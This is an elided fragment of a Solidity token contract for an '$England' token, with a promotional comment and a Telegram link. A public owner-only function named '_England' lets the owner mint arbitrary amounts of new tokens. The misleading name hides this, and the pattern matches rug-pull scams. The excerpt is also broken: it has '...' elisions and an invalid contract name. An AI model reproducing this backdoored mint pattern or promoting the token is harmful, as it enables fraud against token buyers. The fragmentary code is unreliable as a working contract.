...
//
// $England proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/EnglandTokenBsc
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _England(uint256 amount) public onlyOwner {
 _England(msg.sender, amount);
    }
    ...
    function _England(address account, uint256 amount) internal virtual {
...
contract $England is ERC20 {
    ...
    constructor() public ERC20("England", "ENGLAND") {
     _England(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}